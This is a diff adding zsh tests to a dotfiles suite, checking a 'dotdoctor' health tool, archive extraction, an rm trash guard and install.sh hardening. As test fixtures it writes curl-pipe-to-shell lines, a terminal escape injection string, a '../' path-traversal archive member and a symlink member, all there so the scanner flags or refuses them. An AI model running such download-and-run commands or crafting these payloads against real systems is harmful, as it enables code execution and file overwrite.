@@ -924,7 +924,7 @@ print -rl -- '#!/bin/sh' 'echo notes' > "$dd_cl/home/.local/bin/notes.old"
 print -rl -- '#!/bin/sh' 'case "$1" in -S) echo "gh: $2" ;; esac' > "$dd_cl/bin/dpkg"
 print -rl -- '#!/bin/sh' "echo \"apt-get \$*\" >> '$dd_cl/calls'" 'case "$*" in "-s remove gh") echo "Remv gh [9.9.9]" ;; esac' > "$dd_cl/bin/apt-get"
 print -rl -- '#!/bin/sh' "echo \"sudo \$*\" >> '$dd_cl/calls'" 'exec "$@"' > "$dd_cl/bin/sudo"
-chmod +x "$dd_cl"/sys/* "$dd_cl"/home/.local/bin/* "$dd_cl"/bin/*
+chmod 755 "$dd_cl"/sys/* "$dd_cl"/home/.local/bin/* "$dd_cl"/bin/*
 dd_cl_path="$dd_cl/sys:$dd_cl/home/.local/bin:$dd_cl/bin:$dd_cl/farm"
 dd_cl_out=$(env -i PATH="$dd_cl_path" HOME="$dd_cl/home" DOTDOCTOR_STATE="$dd_cl/state" "$(whence -p zsh)" -f -c \
     "fpath=('$DOT_DIR/functions' \$fpath); autoload -Uz dotdoctor dotdoctor-lib dotdoctor-clean; DOTFILES_DIR='$dd_cl/repo'; dotdoctor clean" </dev/null 2>&1)
@@ -935,10 +935,10 @@ assert_contains "clean: names the old agy copy" "$dd_cl_out" "old copy of agy"
 assert_eq "clean: a .old file with no sibling is not flagged" "$([[ "$dd_cl_out" == *notes.old* ]] && echo flagged || echo ignored)" "ignored"
 print -rl -- "fpath=('$DOT_DIR/functions' \$fpath)" "autoload -Uz dotdoctor dotdoctor-lib dotdoctor-clean" "DOTFILES_DIR='$dd_cl/repo'" "dotdoctor clean --apply" > "$dd_cl/runner.zsh"
 dd_cl_script="script -qfec \"env -i PATH='$dd_cl_path' HOME='$dd_cl/home' DOTDOCTOR_STATE='$dd_cl/state' '$(whence -p zsh)' -f '$dd_cl/runner.zsh'\" /dev/null"
-printf 'nnn' | eval "$dd_cl_script" >/dev/null 2>&1
+printf 'n\nn\nn\n' | timeout 60 zsh -c "$dd_cl_script" >/dev/null 2>&1
 assert_eq "clean --apply: n to every question removes nothing" \
     "$(command grep -c 'remove -y' "$dd_cl/calls"; find "$dd_cl/home/.local/bin" -name '*.backup-*' -o -name 'agy.*.old' | wc -l | tr -d ' ')" $'0\n2'
-printf 'yyy' | eval "$dd_cl_script" >/dev/null 2>&1
+printf 'y\ny\ny\n' | timeout 60 zsh -c "$dd_cl_script" >/dev/null 2>&1
 assert_contains "clean --apply: y removes the apt package" "$(command cat -- "$dd_cl/calls")" "sudo apt-get remove -y gh"
 assert_eq "clean --apply: the old copies leave ~/.local/bin" "$(find "$dd_cl/home/.local/bin" -name '*.backup-*' -o -name 'agy.*.old' | wc -l | tr -d ' ')" "0"
 assert_eq "clean --apply: the old copies are in the backup folder" "$(find "$dd_cl/state/removed" -type f | wc -l | tr -d ' ')" "2"
@@ -1350,6 +1350,281 @@ assert_eq "fallback del keeps asking" "$([[ -e $tw_root/w/ff ]] && echo kept || 
 
 command rm -rf "$tw_root"
 unfunction tw tw_count tw_reset tw_fb
+
+# clean --apply: each question reads its own line (y, n, y answers three items), leftovers with the same
+# name from different bin folders keep separate backups, and --help works on clean, check and update.
+dd_pl="/tmp/test_dd_clean_prompt"
+dd_pl_home="$dd_pl/home"; dd_pl_state="$dd_pl/state"; dd_pl_bin="$dd_pl/bin"
+command rm -rf "$dd_pl"; mkdir -p "$dd_pl_bin" "$dd_pl_home/.local/bin" "$dd_pl_home/.bun/bin" "$dd_pl_home/.cargo/bin"
+print -rl -- '#!/bin/sh' 'exit 0' > "$dd_pl_bin/systemctl"; chmod +x "$dd_pl_bin/systemctl"
+for dd_pl_d in .local .bun .cargo; do
+    print -r -- "live-$dd_pl_d" > "$dd_pl_home/$dd_pl_d/bin/tool"
+    print -r -- "old-$dd_pl_d" > "$dd_pl_home/$dd_pl_d/bin/tool.backup-1.0.0"
+done
+dd_pl_runner="$dd_pl_bin/apply.zsh"
+print -rl -- "fpath=('$DOT_DIR/functions' \$fpath)" "autoload -Uz dotdoctor dotdoctor-lib dotdoctor-clean" \
+    "DOTFILES_DIR='$DOT_DIR'" "dotdoctor clean --apply" > "$dd_pl_runner"
+dd_pl_out=$(printf 'y\nn\ny\n' | HOME="$dd_pl_home" XDG_CONFIG_HOME="$dd_pl_home/.config" DOTDOCTOR_STATE="$dd_pl_state" DOTDOCTOR_OFFLINE=1 \
+    PATH="$dd_pl_bin:$PATH" script -qfec "zsh -f '$dd_pl_runner'" /dev/null 2>&1)
+dd_pl_left=0
+for dd_pl_d in .local .bun .cargo; do [[ -e "$dd_pl_home/$dd_pl_d/bin/tool.backup-1.0.0" ]] && (( dd_pl_left += 1 ))
+done
+assert_eq "clean --apply: input y,n,y removes two of three leftovers (the Enter of one answer does not answer the next)" "$dd_pl_left" "1"
+assert_eq "clean --apply: the middle leftover answered n is kept" "$([[ -e "$dd_pl_home/.bun/bin/tool.backup-1.0.0" ]] && echo kept || echo gone)" "kept"
+dd_pl_backs=("$dd_pl_state"/removed/*/*tool.backup-1.0.0*(N))
+assert_eq "clean --apply: two leftovers with one name from two folders give two backup files" "$#dd_pl_backs" "2"
+assert_eq "clean --apply: the backups hold both original contents" \
+    "$(command cat -- "${dd_pl_backs[@]}" 2>/dev/null | sort | tr '\n' ' ')" "old-.cargo old-.local "
+command rm -rf "$dd_pl"
+dd_pl_fn="fpath=('$DOT_DIR/functions' \$fpath); autoload -Uz dotdoctor dotdoctor-lib dotdoctor-clean dotdoctor-check dotdoctor-update; DOTFILES_DIR='$DOT_DIR'"
+for dd_pl_sub in clean check update; do
+    dd_pl_h=$(DOTDOCTOR_OFFLINE=1 zsh -f -c "$dd_pl_fn; dotdoctor $dd_pl_sub --help" </dev/null 2>&1); dd_pl_hrc=$?
+    assert_eq "dotdoctor $dd_pl_sub --help exits 0" "$dd_pl_hrc" "0"
+    assert_contains "dotdoctor $dd_pl_sub --help prints its usage" "$dd_pl_h" "Usage: dotdoctor $dd_pl_sub"
+done
+
+echo -e "\n🧪 Functional: extract/compress never overwrite or escape (real tools)"
+_arc2_out=$(
+    path=(${path:#/tmp/dotfiles_mock_bin}); hash -r
+    T=/tmp/test_arcsafe; command rm -rf "$T"; mkdir -p "$T/bin" "$T/src"; cd "$T/src" || exit 1
+    ok() { [[ "$2" == "0" ]] && print -r -- "OK|$1" || print -r -- "NO|$1"; }
+    print -r -- one > a.txt
+
+    command gzip -c a.txt > "$T/x.gz"
+    mkdir "$T/o_gz"; extract "$T/x.gz" "$T/o_gz" >/dev/null 2>&1
+    ok "extract x.gz writes x, not x.gz.out" "$([[ -f $T/o_gz/x && ! -e $T/o_gz/x.gz.out ]]; print $?)"
+
+    mkdir "$T/o_keep"; print -r -- keep > "$T/o_keep/x"
+    extract "$T/x.gz" "$T/o_keep" >/dev/null 2>&1; rc=$?
+    ok "extract .gz refuses an existing output and keeps it" "$([[ $rc -ne 0 && "$(<$T/o_keep/x)" == keep ]]; print $?)"
+
+    print -r -- notgzip > "$T/bad.gz"
+    mkdir "$T/o_bad"; extract "$T/bad.gz" "$T/o_bad" >/dev/null 2>&1; rc=$?
+    ok "extract corrupt .gz fails and leaves nothing in dest" "$([[ $rc -ne 0 && -z "$(command ls -A $T/o_bad)" ]]; print $?)"
+
+    command tar -czf "$T/k.tar.gz" a.txt
+    mkdir "$T/o_tk"; print -r -- keep > "$T/o_tk/a.txt"
+    extract "$T/k.tar.gz" "$T/o_tk" >/dev/null 2>&1
+    ok "extract tar keeps an existing file" "$([[ "$(<$T/o_tk/a.txt)" == keep ]]; print $?)"
+
+    print -r -- notgzip > "$T/bad.tar.gz"; mkdir "$T/o_msg"
+    print -r -- "$(extract $T/bad.tar.gz $T/o_msg 2>&1)" | command grep -qF "$T/o_msg"
+    ok "extract failure names the destination folder" "$?"
+
+    if (( $+commands[cpio] )); then
+        mkdir -p "$T/rpm/in" "$T/rpm/dest"
+        print -r -- evil > "$T/rpm/evil"
+        ( cd "$T/rpm/in" && print -r -- ../evil | command cpio -o -H newc > "$T/up.rpm" 2>/dev/null )
+        command rm -f "$T/rpm/evil"
+        printf '#!/bin/sh\ncat "$1"\n' > "$T/bin/rpm2cpio"; chmod +x "$T/bin/rpm2cpio"
+        ( PATH="$T/bin:$PATH"; extract "$T/up.rpm" "$T/rpm/dest" >/dev/null 2>&1 ); rpm_rc=$?
+        ok "extract .rpm refuses a ../ member and writes nothing outside" "$([[ $rpm_rc -ne 0 && ! -e $T/rpm/evil ]]; print $?)"
+    fi
+
+    compress "$T/outdir/" a.txt >/dev/null 2>&1
+    ok "compress with a trailing slash names outdir.tar.gz" "$([[ -f $T/outdir.tar.gz ]]; print $?)"
+    command rm -rf "$T"
+)
+for _arc2_line in ${(f)_arc2_out}; do
+    if [[ "$_arc2_line" == OK\|* ]]; then
+        echo -e "  ✅ [PASSED] ${_arc2_line#OK|}"; ((test_passed++))
+    else
+        echo -e "  ❌ [FAILED] ${_arc2_line#NO|}"; ((test_failed++))
+    fi
+done
+unset _arc2_out _arc2_line
+
+# --- rm on machines without trash-put: same guard, option check, safe fallbacks -------
+tg_root="/tmp/test_trash_guard"
+command rm -rf "$tg_root"; mkdir -p "$tg_root/home" "$tg_root/w" "$tg_root/bin_t" "$tg_root/bin_tp" "$tg_root/bin_tl" "$tg_root/bin_none"
+tg_log="$tg_root/argv.log"
+for tg_pair in bin_t:trash bin_tp:trash-put; do
+    command cat > "$tg_root/${tg_pair%%:*}/${tg_pair#*:}" <<FAKE
+#!/bin/sh
+printf '%s\n' "\$*" >> '$tg_log'
+FAKE
+    chmod +x "$tg_root/${tg_pair%%:*}/${tg_pair#*:}"
+done
+ln -s /usr/bin/rm "$tg_root/bin_none/rm"
+printf '#!/bin/sh\nexit 1\n' > "$tg_root/bin_tl/trash-list"; chmod +x "$tg_root/bin_tl/trash-list"
+tg() {  # $1 = PATH dir, $2 = HAS_TRASH_PUT, $3 = HAS_TRASH, $4 = IS_AGENT, $5 = command; prints "rc|stderr|argv log"
+    command rm -f -- "$tg_log"; : > "$tg_root/w/a"
+    local tg_out
+    tg_out=$(cd "$tg_root/w" && env -i HOME="$tg_root/home" PATH="$1" HAS_TRASH_PUT=$2 HAS_TRASH=$3 IS_AGENT=$4 \
+        /usr/bin/zsh -f -c "source '$DOT_DIR/modules/files/trash.zsh'; eval \"\$1\"" x "$5" 2>&1 >/dev/null </dev/null; print -r -- "rc=$?")
+    print -r -- "${tg_out//$'\n'/ }|$(command cat -- "$tg_log" 2>/dev/null | command tr '\n' ';')"
+}
+tg_o=$(tg "$tg_root/bin_t" false true true 'rm ~')
+assert_contains "trash-only rm ~ is refused (guard only; old alias passed HOME to trash)" "$tg_o" "refusing to remove"
+assert_eq "trash-only rm ~ calls no trash (guard only)" "${tg_o#*|}" ""
+tg_o=$(tg "$tg_root/bin_t" false true true 'rm -f missing')
+assert_eq "trash-only rm -f missing is silent rc 0 and calls no trash (old passed '-f missing' to trash)" "$tg_o" "rc=0|"
+tg_o=$(tg "$tg_root/bin_t" false true true 'rm -rf a')
+assert_eq "trash-only rm -rf a calls trash with -- and the path only (old passed -rf)" "$tg_o" "rc=0|-- a;"
+tg_o=$(tg "$tg_root/bin_tp" true true true 'rm -o a')
+assert_contains "rm -o reports an invalid option (old trashed the file)" "$tg_o" "invalid option -- 'o'"
+assert_eq "rm -o calls no trash-put" "${tg_o#*|}" ""
+tg_o=$(tg "$tg_root/bin_tp" true true true 'rm --bogus a')
+assert_contains "rm --bogus reports an unrecognized option" "$tg_o" "unrecognized option '--bogus'"
+tg_o=$(tg "$tg_root/bin_tp" true true true 'rm -rfv --recursive --interactive=never -iI a')
+assert_eq "rm accepts r f v i I and the long forms" "$tg_o" "rc=0|-- a;"
+tg_o=$(tg "$tg_root/bin_none" false false true 'rm a')
+assert_contains "agent shell without a trash tool refuses (old ran rm -i)" "$tg_o" "no trash tool installed; install trash-cli"
+assert_contains "agent shell without a trash tool returns 1" "$tg_o" "rc=1"
+assert_eq "agent shell without a trash tool deletes nothing" "$([[ -e $tg_root/w/a ]] && echo kept || echo gone)" "kept"
+tg_o=$(tg "$tg_root/bin_none" true true true 'rm a')
+assert_contains "stale HAS_TRASH_PUT: rm says run refresh (old: exit 127)" "$tg_o" "trash-put missing, run refresh"
+assert_contains "stale HAS_TRASH_PUT: rm returns 1" "$tg_o" "rc=1"
+tg_o=$(tg "$tg_root/bin_tl" true true true 'empty-trash')
+assert_contains "empty-trash with a failing trash-list reports an error (old said Trash is empty)" "$tg_o" "Could not read the trash"
+assert_contains "empty-trash with a failing trash-list returns 1" "$tg_o" "rc=1"
+command rm -rf "$tg_root"
+unfunction tg
+
+# --- Tooling truth: doctor's cat check, update-versions errors, help rows --------
+echo -e "\n🧪 Tooling: doctor cat check, update-versions fetch errors and pre-releases, help rows"
+dd_dc=$(zsh -f -c "
+_ok() { print OK \$1; }; _fail() { print FAIL \$1; }
+$(sed -n '/^require_shell() {/,/^}/p' "$DOT_DIR/doctor.zsh")
+$(command grep '^require_shell cat ' "$DOT_DIR/doctor.zsh")" 2>&1)
+assert_contains "doctor: cat without a bat alias fails the shell check (old code accepted the real cat)" "$dd_dc" "FAIL cat"
+
+dd_ut="/tmp/test_update_tooling"
+command rm -rf "$dd_ut"; mkdir -p "$dd_ut/bin" "$dd_ut/repo"
+command cp -p "$DOT_DIR/update-versions.sh" "$dd_ut/repo/"; print 7 > "$dd_ut/repo/.freshness"
+printf '[tools]\nbat = { version = "0.1.0", released = "2020-01-01" }\n\n[fonts]\nfiracode-nerd = { version = "0.1.0", released = "2020-01-01" }\n' > "$dd_ut/repo/versions.toml"
+print -rl -- '#!/bin/sh' 'exit 1' > "$dd_ut/bin/gh"
+print -rl -- '#!/bin/sh' 'echo "{\"message\":\"API rate limit exceeded\"}"' > "$dd_ut/bin/curl"
+chmod +x "$dd_ut/bin/curl" "$dd_ut/bin/gh"
+dd_ut_out=$(env -i PATH="$dd_ut/bin:/usr/bin:/bin" HOME="$dd_ut/home" "$(whence -p bash)" "$dd_ut/repo/update-versions.sh" 2>&1 </dev/null | sed $'s/\e\\[[0-9;]*m//g')
+assert_contains "update-versions: a rate-limit answer is reported as fetch failed with its message (old code: no safe release)" "$dd_ut_out" "fetch failed: API rate limit exceeded"
+print -rl -- '#!/bin/sh' 'echo "[{\"tag_name\":\"v3.0.0-rc.1\",\"published_at\":\"2020-02-01T00:00:00Z\",\"draft\":false,\"prerelease\":false}]"' > "$dd_ut/bin/curl"
+dd_ut_out=$(env -i PATH="$dd_ut/bin:/usr/bin:/bin" HOME="$dd_ut/home" "$(whence -p bash)" "$dd_ut/repo/update-versions.sh" --apply 2>&1 </dev/null | sed $'s/\e\\[[0-9;]*m//g')
+assert_eq "update-versions: a -rc tag is never proposed (old code: Updated bat -> v3.0.0-rc.1)" "$(print -r -- "$dd_ut_out" | command grep -c 'Updated bat')" "0"
+print -rl -- '#!/bin/sh' 'echo "[{\"tag_name\":\"0.0.9-foo\",\"published_at\":\"2020-02-01T00:00:00Z\",\"draft\":false,\"prerelease\":false}]"' > "$dd_ut/bin/curl"
+dd_ut_out=$(env -i PATH="$dd_ut/bin:/usr/bin:/bin" HOME="$dd_ut/home" "$(whence -p bash)" "$dd_ut/repo/update-versions.sh" --apply 2>&1 </dev/null | sed $'s/\e\\[[0-9;]*m//g')
+assert_eq "update-versions: a non-numeric tag not newer than the pin is not proposed (old code: Updated bat -> 0.0.9-foo)" "$(print -r -- "$dd_ut_out" | command grep -c 'Updated bat')" "0"
+command rm -rf "$dd_ut"
+unset dd_dc dd_ut dd_ut_out
+
+dd_help=$(help 2>&1)
+for dd_name in path ssh-login ssh-test; do
+    assert_contains "help lists $dd_name (old code had no row)" "$dd_help" "$dd_name"
+done
+unset dd_help dd_name
+
+# --- dotdoctor osv/scan hardening: empty OSV fields, non-JSON answers, escape bytes, rc forms, affected range ---
+dd_hd="/tmp/test_dd_hardening"
+command rm -rf "$dd_hd"; mkdir -p "$dd_hd/fakes" "$dd_hd/home"
+printf '[tools]\nfaketool = { version = "1.0.0", released = "2026-01-01" }\n\n[osv]\nfaketool = "npm:faketool"\n' > "$dd_hd/versions.toml"
+print 14 > "$dd_hd/.freshness"
+printf '#!/bin/sh\necho "faketool 1.0.0"\n' > "$dd_hd/fakes/faketool"; chmod +x "$dd_hd/fakes/faketool"
+print -rl -- '#!/bin/sh' "cat '$dd_hd/canned.json'" 'exit 0' > "$dd_hd/fakes/curl"; chmod +x "$dd_hd/fakes/curl"
+dd_hd_check() { DOTFILES_DIR="$dd_hd" HOME="$dd_hd/home" PATH="$dd_hd/fakes:/usr/bin:/bin" dotdoctor check --advisories 2>&1; }
+
+# 1: an advisory with no aliases and no summary leaves empty TSV fields; the severity must stay HIGH.
+print -r -- '{"vulns":[{"id":"GHSA-noalias-0001","database_specific":{"severity":"HIGH"},"affected":[{"package":{"name":"faketool","ecosystem":"npm"},"ranges":[{"type":"SEMVER","events":[{"introduced":"0"},{"fixed":"1.0.5"}]}]}]}]}' > "$dd_hd/canned.json"
+dd_hd_out=$(dd_hd_check); dd_hd_rc=$?
+assert_contains "osv: an advisory with no aliases keeps its HIGH severity (old code: shifted fields lose it)" "$dd_hd_out" "faketool 1.0.0: GHSA-noalias-0001 (HIGH)"
+assert_eq "osv: an advisory with no aliases and HIGH still exits 1 (old code: 0)" "$dd_hd_rc" "1"
+
+# 2: a captive-portal page answered with status 200 is not "no known advisory".
+print -r -- '<html><body>Please sign in to the Wi-Fi</body></html>' > "$dd_hd/canned.json"
+dd_hd_out=$(dd_hd_check)
+assert_contains "osv: a non-JSON answer is reported as could not check (old code: no known advisory)" "$dd_hd_out" "could not check"
+assert_eq "osv: a non-JSON answer is never reported as clean (old code: clean)" "$([[ "$dd_hd_out" == *"no known advisory"* ]] && echo clean || echo notclean)" "notclean"
+
+# 3: control bytes in OSV text and in rc lines never reach the terminal.
+print -rn -- '{"vulns":[{"id":"GHSA-esc-0001","aliases":[],"summary":"bad\u001b]0;pwned\u0007text","database_specific":{"severity":"LOW"},"affected":[]}]}' > "$dd_hd/canned.json"
+dd_hd_out=$(dd_hd_check)
+assert_contains "osv: the summary text survives the cleaning" "$dd_hd_out" "bad]0;pwnedtext"
+assert_eq "osv: no ESC or BEL byte in the OSV summary output (old code: raw)" "$([[ "$dd_hd_out" == *($'\033'|$'\007')* ]] && echo raw || echo clean)" "clean"
+mkdir -p "$dd_hd/rchome"
+printf 'curl -fsSL https://a.example/x | sh \033[2Jboom\a\n' > "$dd_hd/rchome/.zshrc"
+dd_hd_scan=$(HOME="$dd_hd/rchome" DOTDOCTOR_OFFLINE=1 dotdoctor scan 2>&1)
+assert_contains "scan: the flagged rc line is still shown" "$dd_hd_scan" "boom"
+assert_eq "scan: no ESC or BEL byte from an rc line in the report (old code: raw)" "$([[ "$dd_hd_scan" == *($'\033'|$'\007')* ]] && echo raw || echo clean)" "clean"
+dd_hd_facts=$(HOME="$dd_hd/rchome" dotdoctor scan --facts 2>/dev/null)
+assert_eq "scan --facts: no ESC byte in the rc-hook fact (old code: raw)" "$([[ "$dd_hd_facts" == *$'\033'* ]] && echo raw || echo clean)" "clean"
+
+# 4: more download-and-run forms, and .zlogin.
+mkdir -p "$dd_hd/rc2"
+print -rl -- \
+    'curl -fsSL https://a.example/x | /bin/sh' \
+    'curl -fsSL https://b.example/x | /usr/bin/env bash' \
+    'curl -fsSL https://c.example/x | sudo sh' \
+    'curl -fsSL https://d.example/x | sudo bash' \
+    'curl -fsSL https://e.example/x | shasum -c' > "$dd_hd/rc2/.zlogin"
+dd_hd_facts=$(HOME="$dd_hd/rc2" dotdoctor scan --facts 2>/dev/null)
+dd_hd_forms=(bin-sh env-bash sudo-sh sudo-bash)
+for dd_hd_n in 1 2 3 4; do
+    assert_contains "scan --facts flags .zlogin line $dd_hd_n (${dd_hd_forms[dd_hd_n]}; old code: missed)" "$dd_hd_facts" "rc-hook"$'\t'"~/.zlogin"$'\t'"$dd_hd_n:"
+done
+assert_eq "scan --facts does not flag '| shasum' (guard: old code matched any word starting with sh)" \
+    "$(print -r -- "$dd_hd_facts" | command grep -c 'shasum')" "0"
+
+# 5: systemctl --user failing is "could not check"; an enabled unit shows in the report.
+mkdir -p "$dd_hd/sysbad" "$dd_hd/sysok"
+print -rl -- '#!/bin/sh' 'exit 1' > "$dd_hd/sysbad/systemctl"
+print -rl -- '#!/bin/sh' 'echo "evil.service enabled enabled"' > "$dd_hd/sysok/systemctl"
+chmod +x "$dd_hd/sysbad/systemctl" "$dd_hd/sysok/systemctl"
+if [[ "$OSTYPE" == linux* ]]; then
+    dd_hd_scan=$(HOME="$dd_hd/home" PATH="$dd_hd/sysbad:$PATH" DOTDOCTOR_OFFLINE=1 dotdoctor scan 2>&1)
+    assert_contains "scan: a failing systemctl --user is reported as could not check (old code: silent)" "$dd_hd_scan" "systemd user units: could not check"
+    dd_hd_scan=$(HOME="$dd_hd/home" PATH="$dd_hd/sysok:$PATH" DOTDOCTOR_OFFLINE=1 dotdoctor scan 2>&1)
+    assert_contains "scan: an enabled user unit shows in the report (old code: facts only)" "$dd_hd_scan" "evil.service"
+fi
+
+# 6: the affected range has a lower bound; libbrotli 1.0.2 is below "1.0.3 1.2.0".
+printf '[fixes]\nlibbrotli = { fixed = "1.0.10 1.1.1 1.2.1", released = "2026-10-21 2026-10-21 2026-10-21", cve = "CVE-2026-111497", affected = "1.0.3 1.2.0" }\nlibbrotli-pin = { fixed = "1.0.10 1.1.1 1.2.1", released = "2026-10-21 2026-10-21 2026-10-21", cve = "CVE-2026-111497", affected = "1.0.3 1.2.0" }\n' > "$dd_hd/fixes.toml"
+print -rl -- "fpath=('$DOT_DIR/functions' \$fpath)" "autoload -Uz dotdoctor-lib" "DOTFILES_DIR='$dd_hd'" "dotdoctor-lib" \
+    "DD_TOML='$dd_hd/fixes.toml'" \
+    'DD_FAILS=0; _dd_advisory lib libbrotli 1.0.2; print "fails_low=$DD_FAILS"' \
+    'DD_FAILS=0; _dd_advisory lib libbrotli 1.0.5; print "fails_in=$DD_FAILS"' \
+    '_dd_pin_advisories libbrotli 1.0.2; print "pin_low=$#DD_PIN_MSGS"' \
+    '_dd_pin_advisories libbrotli 1.0.5; print "pin_in=$#DD_PIN_MSGS"' > "$dd_hd/range.zsh"
+dd_hd_out=$(DOTDOCTOR_OFFLINE=1 zsh -f "$dd_hd/range.zsh" 2>&1)
+assert_contains "_dd_advisory: 1.0.2 is below the affected range, no failure (old code: flagged)" "$dd_hd_out" "fails_low=0"
+assert_contains "_dd_advisory: 1.0.5 inside the range still fails (guard)" "$dd_hd_out" "fails_in=1"
+assert_contains "_dd_pin_advisories: pin 1.0.2 below the range gives no message (old code: 1)" "$dd_hd_out" "pin_low=0"
+assert_contains "_dd_pin_advisories: pin 1.0.5 inside the range gives a message (guard)" "$dd_hd_out" "pin_in=1"
+
+# 7: Brotli-*.dist-info with a capital B is found.
+mkdir -p "$dd_hd/py/lib/python3.12/site-packages/Brotli-1.0.9.dist-info"
+assert_contains "_dd_py_dists finds Brotli-*.dist-info (old code: -name, case-sensitive)" \
+    "$(DOTDOCTOR_PY_ROOTS="$dd_hd/py" zsh -f -c "fpath=('$DOT_DIR/functions' \$fpath); autoload -Uz dotdoctor-lib; DOTFILES_DIR='$dd_hd'; dotdoctor-lib; _dd_py_dists" 2>&1)" "Brotli-1.0.9.dist-info"
+
+# 8: scan --help prints usage and succeeds.
+dd_hd_out=$(dotdoctor scan --help 2>&1); dd_hd_rc=$?
+assert_eq "scan --help exits 0 (old code: 1)" "$dd_hd_rc" "0"
+assert_contains "scan --help prints its usage" "$dd_hd_out" "Usage: dotdoctor scan"
+unfunction dd_hd_check
+command rm -rf "$dd_hd"
+
+# install.sh refuses a symlink archive member, fails closed on a missing release date and scopes the font pin to [fonts].
+dd_ib="/tmp/test_install_hardening"
+command rm -rf "$dd_ib"; mkdir -p "$dd_ib/bin" "$dd_ib/home/.local/bin" "$dd_ib/tar"
+awk '/^    _(place_bin|install_bin)\(\) \{/{p=1} p{print} p&&/^    \}/{p=0}' "$DOT_DIR/install.sh" > "$dd_ib/fns.sh"
+awk '/^ *_quarantine_cutoff\(\) \{/{p=1} /^ *_quarantined\(\) \{/{p=1} p{print} p&&/^(    )?\}/{p=0}' "$DOT_DIR/install.sh" > "$dd_ib/q.sh"
+print secret > "$dd_ib/secret"
+ln -s "$dd_ib/secret" "$dd_ib/tar/tool"
+PATH=/usr/bin:/bin tar czf "$dd_ib/link.tgz" -C "$dd_ib/tar" tool
+dd_ib_sum=$(sha256sum "$dd_ib/link.tgz" | awk '{print $1}')
+print -rl -- '#!/bin/sh' 'out=""; prev=""; for a in "$@"; do [ "$prev" = -o ] && out=$a; prev=$a; done' \
+    "if [ -n \"\$out\" ]; then cp '$dd_ib/link.tgz' \"\$out\"; else echo '$dd_ib_sum  link.tgz'; fi" > "$dd_ib/bin/curl"
+chmod +x "$dd_ib/bin/curl"
+dd_ib_out=$(HOME="$dd_ib/home" PATH="$dd_ib/bin:/usr/bin:/bin" bash -c "source '$dd_ib/fns.sh'; _install_bin tool https://example.invalid/t.tgz https://example.invalid/sums tar tool; echo rc=\$?" 2>&1)
+assert_contains "_install_bin: a symlink member of a verified archive is refused" "$dd_ib_out" "is a symlink, not a regular file"
+assert_eq "_install_bin: the symlink refusal exits 1" "${dd_ib_out##*rc=}" "1"
+assert_eq "_install_bin: nothing is placed for a symlink member" "$([[ -e "$dd_ib/home/.local/bin/tool" ]] && echo placed || echo none)" "none"
+dd_ib_q=$(FRESH_DAYS=3 bash -c "source '$dd_ib/q.sh'; _quarantined tool 1.0 ''; echo rc=\$?" 2>&1)
+assert_eq "_quarantined: an empty release date is refused" "${dd_ib_q##*rc=}" "1"
+assert_contains "_quarantined: the empty-date warning names the tool" "$dd_ib_q" "tool v1.0: no release date"
+printf '%s\n' '[osv]' 'firacode-nerd = "pypi:x"' '[fonts]' 'firacode-nerd = { version = "3.5.1", released = "2026-08-21" }' '[fixes]' 'firacode-nerd = { version = "9.9.9", released = "2099-01-01" }' > "$dd_ib/versions.toml"
+command grep -E '^ *(_font_row|FONT_VER|FONT_RELEASED)=' "$DOT_DIR/install.sh" > "$dd_ib/font.sh"
+assert_eq "install.sh font pin: version and date come from [fonts] only" \
+    "$(DOTFILES_DIR="$dd_ib" bash -c "source '$dd_ib/font.sh'; echo \"\$FONT_VER \$FONT_RELEASED\"" 2>&1)" "3.5.1 2026-08-21"
+command rm -rf "$dd_ib"
 
 # --- Final check: this run printed no "command not found" ----------------------
 # Stop the capture first: tee has then read the whole run, and the log is complete.
